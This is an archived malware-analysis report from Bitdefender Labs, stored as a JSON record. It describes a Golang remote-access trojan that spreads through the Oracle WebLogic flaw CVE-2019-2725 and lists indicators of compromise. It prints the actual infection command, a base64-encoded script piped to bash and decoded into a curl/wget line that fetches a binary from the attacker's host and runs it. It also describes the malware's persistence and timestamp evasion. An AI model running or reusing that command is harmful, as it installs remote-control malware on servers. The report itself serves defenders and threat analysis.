{
    "id": "8435b0b1-9ac6-4138-93fc-4eed963fa2d0",
    "created_at": "2023-01-12T15:05:10.981978Z",
    "updated_at": "2025-03-27T02:05:54.679738Z",
    "deleted_at": null,
    "sha1_hash": "b722596591ccb79c981b7222b380f29ae7755022",
    "title": "2020-10-09 - There’s a New a Golang-written RAT in Town",
    "authors": "",
    "file_creation_date": "2022-05-28T17:45:00Z",
    "file_modification_date": "2022-05-28T17:45:00Z",
    "file_size": 265990,
    "plain_text": "# There's a New a Golang-written RAT in Town\n\n**[labs.bitdefender.com/2020/10/theres-a-new-a-golang-written-rat-in-town/](https://labs.bitdefender.com/2020/10/theres-a-new-a-golang-written-rat-in-town/)**\n\n[Anti-Malware Research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n5 min read\n\n[Silvia PRIPOAE](http://10.10.0.46/blog/labs/author/spripoae/)\nOctober 09, 2020\n\nOne product to protect all your devices, without slowing them down.\n\n[Free 90-day trial](http://10.10.0.46/media/html/consumer/new/get-your-90-day-trial-opt/index.html)\n\n\n-----\n\nSecurity researchers at Bitdefender have discovered a new Golang-written RAT that targets\n[devices by using the CVE-2019-2725 (Oracle WebLogic RCE) vulnerability identified last](https://www.oracle.com/security-alerts/alert-cve-2019-2725.html)\nyear. Unlike other bots that have exploited this vulnerability, it doesn’t try to install a\ncryptominer or deploy other malware — at least not yet.\n\nOracle published the details on the CVE-2019-2725 vulnerability in April 2019 but reports of\nexploits in the wild appeared long before then. In any case, this CVE has a CVSS score of\n9.8, which makes it a prime candidate. The only requirement is an exposed Oracle\nWebLogic Server, and there’s an abundance of them accessible online, with no security and\nstill unpatched.\n\n### There was a crack, that’s how they got in\n\nSome malware tends to use less technical approaches when trying to infect devices, going\nafter open ports and performing brute force attacks with common credentials. That kind of\nactivity works on a vast array of devices, and the bad actors don’t really care what they\ninfect, as long as it’s working\n\nBy contrast, malware like this one works on specific targets running Oracle WebLogic\nservers. It’s a technology not usually on the frontline, so consumers often don’t know that\nit’s there or that it even exists. But such servers are widespread, especially since they are\npart of the cloud, with their ability to run apps for users.\n\n\n-----\n\nOracle WebLogic servers are not normally exposed to the online world, but not everyone is\ncareful. When CVE-2019-2725 came out, a rough estimate was that attackers could\ncompromise tens of thousands of unsecured WebLogic servers.\n\nThis new campaign is not original when it comes to exploiting this CVE, but it’s a new\nmalware still in development, and it could go in any direction.\n\nThe infection payload uses the CVE, giving the attacker access:\n```\nnohup echo\nY3VybCBodHRwOi8vYm94LmNvbmYxZy5jb20vbC9zb2RkL1NlY3VyaXR5Lkd1YXJkIC1vIC90bXAvcHJvYy50b\n | base64 -d | /bin/bash > /dev/null 2>&1 &; \n\n```\nThe base64 might not look all that impressive, but in text format it becomes clearer:\n```\ncurl http://box.conf1g.com/l/sodd/Security.Guard -o /tmp/proc.tmp || wget -c -t 20\nhttp://box.conf1g.com/l/sodd/Security.Guard -O /tmp/proc.tmp ; chmod 0755\n/tmp/proc.tmp ;nohup /tmp/proc.tmp > /dev/null 2>&1 &\n\n```\nThis particular version was designed to work on Linux and on x86 architecture, but the fact\nthat the RAT is developed in Golang lets the attacker easily compile versions for other\noperating systems and architectures.\n\n### A RAT enters a server…\n\nAs the payload shows, the malware comes with two-Golang-written binaries,\n‘ Security.Guard ’ and ‘ Security.Script’, compiled for x86. The first one packed with\nUPX (an open-source executable packer with support for numerous OSes).\n\nHere’s a more detailed description of the functions:\n\nPackage main: `C:/Go/Guard/src/Main`\n\nFile: `GuardMain.go`\n\n\n-----\n\n```\ninit Lines: 30 to 32 (2)\nLoadEnv Lines: 80 to 95 (15)\nReceiveSignal Lines: 95 to 109 (14)\ninit0 Lines: 109 to 138 (29)\nInstallStartUp Lines: 138 to 168 (30)\ncopyToFile Lines: 168 to 197 (29)\nChangeSelfTime Lines: 197 to 207 (10)\nExecShell Lines: 207 to 217 (10)\nDownload Lines: 217 to 249 (32) \nGetVersion Lines: 249 to 291 (42)\nkillLockFile Lines: 291 to 302 (11)\nkillRepeat Lines: 302 to 337 (35)\nrun Lines: 337 to 437 (100)\nIsDir Lines: 437 to 448 (11)\nGuardProc Lines: 448 to 479 (31)\nMd5Sum Lines: 479 to 495 (16)\nUpdate Lines: 495 to 523 (28)\nmain Lines: 523 to 527 (4)\nmainfunc1 Lines: 527 to 537 (10)\n\n```\nPackage main: `C:/Users/john/Desktop/NiuB/Linux&C#/src/Linux/Main`\nFile: `Main.go`\n```\ninit0 Lines: 54 to 71 (17)\nmain Lines: 71 to 125 (54)\nReceiveSignal Lines: 125 to 141 (16)\nMakeOnlineInfo Lines: 141 to 176 (35)\nEncrypt Lines: 176 to 186 (10) \nMd5Sum Lines: 186 to 202 (16)\nkillLockFile Lines: 202 to 217 (15)\nkillRepeat Lines: 217 to 246 (29)\nMakeUUID Lines: 246 to 268 (22) \nGetOsInfo Lines: 268 to 308 (40)\nGetIPs Lines: 308 to 343 (35)\nInitStart Lines: 343 to 351 (8) \nDownload Lines: 351 to 387 (36) \nExecShell Lines: 387 to 400 (13)\nChangeSelfTime Lines: 400 to 411 (11)\nSetTimeOut Lines: 411 to 418 (7)\nMsgProcess Lines: 418 to 444 (26)\n\n```\nThe ‘ Security.Guard ‘ binary has three jobs: downloading the RAT, initializing it and\nmaking sure it stays operational. It remains present after the infection as it monitors for\nversion changes by interrogating an URL of on the hosting server (` l/sodd/ver ‘), from\nwhich it parses two md5 values. If these hashes differ from the one of the Guard and RAT,\nthe binaries are updated and restarted.\n\nInterestingly, both the Guard and the RAT enforce the singleton property, which means that\nonly a single instance of the malware can run on the device. The malware uses two\nmethods to remain the only one. First, it stores the PID in a ‘lock file,’ allowing it to kill a new\nidentical process. Second, it checks running process to identify other instances of the same\nmalware.\n\n\n-----\n\nAdditionally, the Guard uses the same process-iterating code to check that the RAT is\nrunning, and restarts it otherwise. To identify the process, the routine performs md5 hashes\non the ‘ /proc/<PID>/exe ‘ file for each process and compares it with the known hash of\nthe RAT binary.\n\nOf course, the malware also uses an evasion technique. The timestamps of all created files\nare set in the past, using one of the following two rules:\n```\n* `2012-12-21 12:31:09`\n* `2018-10-11 18:52:46`\n\n```\nThe malware wouldn’t be complete without achieving persistence and surviving reboot. The\nGuard runs a persistence script that plants a startup script in a location that depends on the\nLinux distribution. In this case, the script supports CentOS, Ubuntu and Debian.\n\n### Leaving the door open for intruders\n\nThe RAT connects to the C2, sending a check-in message containing fingerprinting\ninformation for the system, then listens for commands. The data sent back to the operators\nincludes the hardware of the devices, the OS and the IP. Communication with the C2 is\nencrypted using a simple XOR cipher with key 0x86.\n\nIt comes with support for just two commands, but offers attackers a wide range of\npossibilities:\n\nCOMMAND (execute shell commands)\nDOWNLOAD (download and run binary)\n\n\n-----\n\nThis RAT appears to be connected with the PowerGhost campaign reported last year. The\ntwo share the hosting server, the URIs and part of the code from the bash scripts.\n\nAlthough the payloads propagated through CVE-2019-2725 are hosted at different URIs,\n‘ l/sodd/syn ‘ and ‘ l/sodd/udp ‘ were included in past reports, now host a version of\n‘ Security.Guard ’ as well.\n\nThe persistence script retains part of the payloads reported last year. Although the newer\ncampaign lacks lateral movement and privilege escalation capabilities, the Golang malware\nappears to be in an early phase of development. Even so, the fact that it lets attackers\ndownload and run any binary they choose should be worrisome enough.\n\n### Indicators of compromise\n\n**URLs:**\n\nhxxp://box.conf1g.com/l/sodd/Security.Guard hxxp://box.conf1g.com/l/sodd/Security.Script\nhxxp://box.conf1g.com/l/sodd/ver\n\n**C2:**\n\nlog.conf1g[.]com:53\n\n**IPs:**\n\n185.128.41[.]90 185.234.218[.]247\n\n**Hashes:**\n\ne457b6f24ea5d3f2b5242074f806ecffad9ab207\nadd4db43896f65d096631bd68aa0d1889a5ff012\n5b2275e439f1ffe5d321f0275711a7480ec2ac90\nfc594723788c545fae34031ab6abe1e0a727add4\n26a70988bd873e05018019b4d3ef978a08475771\n\n**Filenames:**\n\n/var/tmp/…/.esd-644/auditd /bin/.securetty/.esd-644/auditd /usr/sbin/abrtd devkit-powerdaemon .nginx.lockfile .httpd.lockfile .1e8247d9f7f3f4fe8f1c097094d7ff08\n\n**TAGS**\n\n[anti-malware research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n\n-----\n\n**AUTHOR**\n\n## Silvia PRIPOAE\n\n[View all posts](http://10.10.0.46/blog/labs/author/spripoae/)\n\n\n## Silvia PRIPOAE\n\n[View all posts](http://10.10.0.46/blog/labs/author/spripoae/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-09 - There’s a New a Golang-written RAT in Town.pdf"
    ],
    "report_names": [
        "2020-10-09 - There’s a New a Golang-written RAT in Town.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535910,
    "ts_updated_at": 1743041154,
    "ts_creation_date": 1653759900,
    "ts_modification_date": 1653759900,
    "files": {
        "pdf": "https://archive.orkl.eu/b722596591ccb79c981b7222b380f29ae7755022.pdf",
        "text": "https://archive.orkl.eu/b722596591ccb79c981b7222b380f29ae7755022.txt",
        "img": "https://archive.orkl.eu/b722596591ccb79c981b7222b380f29ae7755022.jpg"
    }
}